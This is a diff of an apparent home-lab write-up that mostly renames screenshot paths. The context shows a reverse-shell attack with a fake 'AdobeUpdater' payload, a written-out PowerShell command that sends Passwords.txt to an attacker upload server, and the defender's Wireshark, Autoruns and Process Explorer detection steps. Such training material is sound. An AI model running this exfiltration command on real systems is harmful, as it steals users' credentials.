@@ -82,7 +82,7 @@ one to handle file uploads as shown in Figure 2.*
 <img src="analysis/screenshots_v1/Figure_1.png" alt="Kali Terminal: Netcat Listener" width="75%"><br>
 <em>In this terminal a Netcat listener is started on port 443 for the reverse shell.</em>
 <br><sub>(Figure 2)</sub><br>
-<img src="analysis/screenshots/kt1.png" alt="Kali Terminal: Upload Server" width="75%"><br>
+<img src="analysis/screenshots_v1/Figure_2.png" alt="Kali Terminal: Upload Server" width="75%"><br>
 <em>In this terminal, the attacker starts a Python upload server on port 8080.</em>
 </p>
 
@@ -106,21 +106,21 @@ to mask the malicious activity.*<br>
 *In Figure 6, we can see the attacker successfully catches the reverse shell and a connection is now established from the victim’s machine back to the attacker's Netcat listener.
 Next, the attacker runs the `ls` command to list the contents of the current working directory.*
 <br><sub>(Figure 6)</sub><br>
-<img src="analysis/screenshots/5.png" alt="Payload connects" width="65%"><br>
+<img src="analysis/screenshots_v1/Figure_6.png" alt="Payload connects" width="65%"><br>
 
 ### 4. Attacker Navigates the File System
 *In Figure 7, the attacker begins backing out of the current directory using the `cd` command repeating `cd ..` until reaching the user's home directory.
 They then run the `ls` command again and spot the Documents directory witch is there target.*
 <br><sub>(Figure 7)</sub><br>
-<img src="analysis/screenshots/6.png" alt="Directory listing" width="65%"><br>
+<img src="analysis/screenshots-v1/Figure_7.png" alt="Directory listing" width="65%"><br>
 
 *Figure 8 shows the attacker using the `cd` command to enter the Documents directory.*
 <br><sub>(Figure 8)</sub><br>
-<img src="analysis/screenshots/7.png" alt="Navigating directories" width="65%"><br>
+<img src="analysis/screenshots_v1/Figure_8.png" alt="Navigating directories" width="65%"><br>
 
 *In Figure 9, we see the attacker has successfully navigated into the Documents folder. Inside, they spot a file named Passwords.txt.*
 <br><sub>(Figure 9)</sub><br>
-<img src="analysis/screenshots/8.png" alt="Accessing Documents" width="65%"><br>
+<img src="analysis/screenshots/Figure_9.png" alt="Accessing Documents" width="65%"><br>
 
 ---
 
@@ -131,11 +131,11 @@ At this point they’re ready to begin the second stage of the attack. They’ve
 ---
 *In Figure 10, we can see the attacker preparing to use a PowerShell command with the PUT method to upload the Passwords.txt file to their Python-based upload server.*
 <br><sub>(Figure 10)</sub><br>
-<img src="analysis/screenshots/11.png" alt="Upload success" width="65%"><br>
+<img src="analysis/screenshots_v1/Figure_10.png" alt="Upload success" width="65%"><br>
 
 *Refer to **Figure 11** for how the exfiltration command is constructed.*
 <br><sub>(Figure 11)</sub><br>
-<img src="analysis/screenshots/9.png" alt="PowerShell Exfiltration Command Reference" width="75%"><br>
+<img src="analysis/screenshots_v1/Figure_11.png" alt="PowerShell Exfiltration Command Reference" width="75%"><br>
 Then, run the following PowerShell command to upload the `Passwords.txt` file to the attacker's Python server:
  ```powershell
 powershell -c "Invoke-WebRequest -Uri http://192.168.78.129:8080/Passwords.txt -Method Put -InFile 'C:\Users\IEUser\Documents\Passwords.txt'"
@@ -144,11 +144,11 @@ powershell -c "Invoke-WebRequest -Uri http://192.168.78.129:8080/Passwords.txt -
 ---
 *In Figure 12, we return to the second terminal first mentioned in Figure 2. This is the terminal running the Python upload server on port 8080, and you'll notice it’s still idle. For this demo, the folder containing the Python script has been opened and placed at the bottom of the screen. The reason: if anything gets uploaded, we’ll see it appear here in real-time. As of now, there are only four files in the directory.*
 <br><sub>(Figure 12)</sub><br>
-<img src="analysis/screenshots/10.png" alt="Exfiltration command" width="65%"><br>
+<img src="analysis/screenshots_v1/Figure_12.png" alt="Exfiltration command" width="65%"><br>
 
 *Next in Figure 13, after the PowerShell command from Figure 10 is run, we get a hit — the `Passwords.txt` file is displayed in the command line output. And just like we talked about in Figure 12, the folder now shows five files, one of them being `Passwords.txt,` confirming the upload was successful.*
 <br><sub>(Figure 13)</sub><br>
-<img src="analysis/screenshots/12.png" alt="Wireshark: TCP stream" width="65%"><br>
+<img src="analysis/screenshots_v1/Figure_13.png" alt="Wireshark: TCP stream" width="65%"><br>
 
 ---
 ## 🛡️ Defender’s Perspective: Detecting the Attack in Action
@@ -161,16 +161,16 @@ This next section walks through how security analysts can spot and respond to th
 
 In **Figure 14**, we have a Wireshark capture that was running during the attack. In this screenshot, we can see a `PUT` request made for the `Passwords.txt` file — indicating possible data exfiltration over HTTP.
 <br><sub>(Figure 14)</sub><br>
-<img src="analysis/screenshots/13.png" alt="Wireshark: HTTP PUT" width="75%"><br>
+<img src="analysis/screenshots_v1/Figure_14.png" alt="Wireshark: HTTP PUT" width="75%"><br>
 
 In **Figure 15**, now that we’ve confirmed a PUT request occurred, we can filter the capture to isolate it. To do this, we type the following into Wireshark’s display filter bar `http.request.method == "PUT"`
 Then hit the **blue arrow** in the top-right to apply the filter.
 <br><sub>(Figure 15)</sub><br>
-<img src="analysis/screenshots/15.png" alt="Wireshark Focused" width="75%"><br>
+<img src="analysis/screenshots_v1/Figure_15.png" alt="Wireshark Focused" width="75%"><br>
 
 In **Figure 16**, we see there was only one `PUT` request made, which confirms our earlier finding — the exfiltrated file was `Passwords.txt`.
 <br><sub>(Figure 16)</sub><br>
-<img src="analysis/screenshots/16.png" alt="Follow Stream" width="75%"><br>
+<img src="analysis/screenshots_v1/Figure_16.png" alt="Follow Stream" width="75%"><br>
 
 Next, in **Figure 17**, if we right-click on the filtered packet and choose **Follow > HTTP Stream** (highlighted in blue). This allows us to view the entire payload of the HTTP session and validate what was transferred.
 <br><sub>(Figure 17)</sub><br>
@@ -180,7 +180,7 @@ In **Figure 18**, after following the HTTP stream, we can see the full contents 
 We also see other important details, such as the server responding with a `201 Created` status, confirming a successful upload. The `User-Agent` header shows the transfer was performed using `Python/3.11.9`, pointing to Python’s built-in `http.server` module.
 An internal host sending a `PUT` request over port 8080 using non-standard tools like this should raise red flags during packet inspection.
 <br><sub>(Figure 18)</sub><br>
-<img src="analysis/screenshots/19.png" alt="Autoruns Registry" width="65%"><br>
+<img src="analysis/screenshots_v1/Figure_18.png" alt="Autoruns Registry" width="65%"><br>
 
 ---
 ### 🔍 Persistence Detection via Autoruns and Registry Analysis
@@ -212,12 +212,12 @@ This section highlights suspicious process behavior observed using Sysinternals 
 ---
 **Figure 22** shows a suspicious `powershell.exe` process running under the user `IEUser`. This process is not expected under normal conditions and does not match any known authorized scripts.
 <br><sub>(Figure 22)</sub><br>
-<img src="analysis/screenshots/23.png" alt="TCP/IP Connections" width="65%"><br>
+<img src="analysis/screenshots/Figure_23.png" alt="TCP/IP Connections" width="65%"><br>
 
 **Figure 23** drills into the process properties of `powershell.exe`. The command line confirms it’s executing with<br>
 `-ExecutionPolicy Bypass -WindowStyle Hidden`, which is commonly used to evade detection. The **current directory** is also telling — it's set to:`C:\Users\IEUser\Downloads\Test Malware\AdobeUpdater\` This aligns directly with the malicious payload path.
 <br><sub>(Figure 23)</sub><br>
-<img src="analysis/screenshots/24.png" alt="Payload Directory" width="55%"><br>
+<img src="analysis/screenshots_v1/Figure_23.png" alt="Payload Directory" width="55%"><br>
 
 **Figure 24** shows the **TCP/IP** tab of the same process, confirming it has an active network connection to:`192.168.78.129:HTTPS`<br>This indicates that the PowerShell process is maintaining a live connection — supporting evidence of a reverse shell callback.
 <br><sub>(Figure 24)</sub><br>
